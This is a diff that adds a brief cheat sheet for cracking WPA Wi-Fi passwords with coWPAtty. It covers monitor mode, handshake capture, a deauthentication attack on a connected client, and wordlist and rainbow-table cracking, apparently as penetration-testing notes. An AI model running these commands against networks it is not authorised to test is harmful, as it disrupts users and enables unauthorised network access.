@@ -1,0 +1,28 @@
+COWPATTY ATTACK
+coWPAtty Attack
+-----------------
+
+Place your wireless card into monitor mode on the channel number of the AP:
+
+airmon-ng start <interface> <AP channel>
+
+Start an Airodump capture, filtering on the AP channel and BSSID, saving the file to disk:
+
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+Deauthenticate a connected client to force it to complete the 4-way handshake:
+
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+To crack the WPA password with coWPAtty in wordlist mode:
+
+cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
+
+To use rainbow table mode with coWPAtty, first generate the hashes:
+
+genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
+
+Run coWPAtty with the generated hashes to recover the WPA password:
+
+cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
+
